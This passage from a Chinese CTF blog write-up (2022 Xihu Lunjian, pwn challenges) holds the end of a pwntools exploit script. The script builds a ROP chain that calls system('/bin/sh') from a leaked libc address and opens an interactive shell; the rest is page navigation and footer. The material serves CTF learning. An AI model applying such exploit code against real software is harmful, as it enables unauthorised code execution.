class="line">		success(<span class="string">&quot;base =&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">		system = puts - <span class="number">0x06f6a0</span> + <span class="number">0x453a0</span></span><br><span class="line">		str_bin_sh = puts - <span class="number">0x06f6a0</span> + <span class="number">0x18ce57</span></span><br><span class="line">		payload = <span class="string">&quot;24\x00\x00&quot;</span> + p32(<span class="number">0</span>)</span><br><span class="line">		<span class="comment"># payload += p64(0x0400BB8) * 20 + p64(0x400CA3) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(0x400789) + p64(0x400789)</span></span><br><span class="line"></span><br><span class="line">		payload += p64(<span class="number">0x0400BB8</span>) * <span class="number">19</span> + p64(<span class="number">0x400CA3</span>) + p64(str_bin_sh) +p64(<span class="number">0x0400BB8</span>)  + p64(system) + p64(</span><br><span class="line">			<span class="number">0x400789</span>) + p64(<span class="number">0x400789</span>)</span><br><span class="line">		payload += p8(<span class="number">19</span>) + p8(<span class="number">36</span>) + p8(<span class="number">53</span>) + p8(<span class="number">70</span>) + p8(<span class="number">55</span>) + p8(<span class="number">66</span>) + p8(<span class="number">17</span>) + p8(<span class="number">161</span>)</span><br><span class="line">		payload += p8(<span class="number">50</span>) + p8(<span class="number">131</span>) + p8(<span class="number">212</span>) + p8(<span class="number">101</span>) + p8(<span class="number">118</span>) + p8(<span class="number">199</span>) + p8(<span class="number">24</span>) + p8(<span class="number">3</span>)</span><br><span class="line">		payload += p32(<span class="number">0x400BB8</span>) * <span class="number">1</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x400789</span>) + p32(<span class="number">0x38</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		p.interactive()</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


  </div>
  <!--文末结束语-->
  
    <div style="text-align:center;color: #ccc;font-size:24px;"> --- 我是有底线的 --- </div>
  
  <!--页脚广告-->
  
  <div class="mdui-divider"></div>
  
  <nav>
    
      <a rel="prev" class="post-nav-item mdui-float-left" href="/VT-%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">
        <i class="iconfont icon-angle-left"></i>
        <span>VT 技术学习</span>
      </a>
    
    
      <a rel="next" class="post-nav-item mdui-float-right" href="/fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/">
        <span>fiddler证书有效期时长设置</span>
        <i class="iconfont icon-angle-right"></i>
      </a>
    
  </nav>
</article>




  <div class="toc-button"  style="z-index: 100;">
    <button class="mdui-fab mdui-ripple mdui-color-teal" mdui-menu="{target: '#toc'}"><i class="iconfont icon-list"></i></button>
    <ul class="mdui-menu" id="toc">
      <li class="mdui-menu-item">
        <a href="/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/" id="toc-header" class="mdui-ripple">文章目录</a>
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#re-%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">re 部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dual-personality"><span class="toc-number">1.1.</span> <span class="toc-text">dual personality</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyre"><span class="toc-number">1.2.</span> <span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EasyVT"><span class="toc-number">1.3.</span> <span class="toc-text">EasyVT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-%E9%83%A8%E5%88%86"><span class="toc-number">2.</span> <span class="toc-text">pwn 部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MessageBoard"><span class="toc-number">2.1.</span> <span class="toc-text">MessageBoard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babycalc"><span class="toc-number">2.2.</span> <span class="toc-text">babycalc</span></a></li></ol></li></ol>
      </li>
    </ul>
  </div>



    <div id="comment" class="mdui-card mdui-p-a-2 mdui-m-b-5">
      <div class="mdui-tab" mdui-tab>
        
          <a href="#comment-tab0" class="mdui-ripple">gitalk</a>
        
          <a href="#comment-tab1" class="mdui-ripple">livere</a>
        
      </div>
      
        <div id="comment-tab0" class="mdui-p-a-2">
          <div id="gitalk-container"></div>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
    clientID: '',
    clientSecret: '',
    repo: '',
    owner: '',
    admin: [''],
    id:  md5(location.pathname) ,
    distractionFreeMode: 'true',
  });
  gitalk.render('gitalk-container');
</script>
        </div>
      
        <div id="comment-tab1" class="mdui-p-a-2">
          <div id="lv-container" data-id="city" data-uid="">
  <script type="text/javascript">
    (function (d, s) {
      var j, e = d.getElementsByTagName(s)[0];
      if (typeof LivereTower === 'function') { return; }
      j = d.createElement(s);
      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
      j.async = true;
      e.parentNode.insertBefore(j, e);
    })(document, 'script');
  </script>
  <noscript>Please enable JavaScript to view the comments powered by LiveRe.</noscript>
</div>
        </div>
      
    </div>

  </main>
  <footer id="footer" class="mdui-text-center mdui-m-t-5 mdui-p-b-2 mdui-p-t-4 mdui-color-theme">
  <div class="mdui-container">
    <div class="mdui-row">
      
        <a href="https://beian.miit.gov.cn" rel="noopener" target="_blank"></a>
      
      <span>
        &copy; 2023 - 2023 
        
          <span style="color:#d9333f" class="iconfont icon-heart"></span>
        
        Gyan
      </span>
    </div>
    <div class="mdui-row">
      
        <div class="mdui-col-xs-6 mdui-text-right">
          <span>Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a></span>
        </div>
        <div class="mdui-col-xs-6 mdui-text-left">
          <span>Theme: <a href="https://github.com/kb1000fx/Meadow" rel="noopener" target="_blank">Meadow</a></span>
        </div>
      
    </div>
    <div class="mdui-row">
      
    </div>
 </div>
</footer>
  
  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-teal" style="z-index:100;"><i class="iconfont icon-arrowup"></i></button>
  
  




    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
    <script>mermaid.initialize({
        startOnLoad: true,
        theme: "default"
    });</script>




    
<script src="/js/mdui.min.v1.0.0.js"></script>




<script src="/js/meadow.js"></script>

</body>
</html >